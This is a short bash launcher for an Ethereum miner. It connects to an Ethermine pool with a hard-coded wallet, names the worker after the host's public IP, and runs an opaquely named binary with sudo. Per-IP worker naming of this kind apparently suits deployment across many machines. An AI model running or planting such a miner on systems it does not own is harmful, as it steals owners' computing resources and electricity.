#!/bin/bash

POOL=ssl://eu1.ethermine.org:5555
WALLET=0x86fc2bf54eeb39059638c91ade97322948882b9c.$(echo "$(curl -s ifconfig.me)" | tr . _ )-maune

cd "$(dirname "$0")"

chmod +x ./maune && sudo ./maune -pool $POOL -wal $WALLET $@ -pass x -proto 3 -stales 0
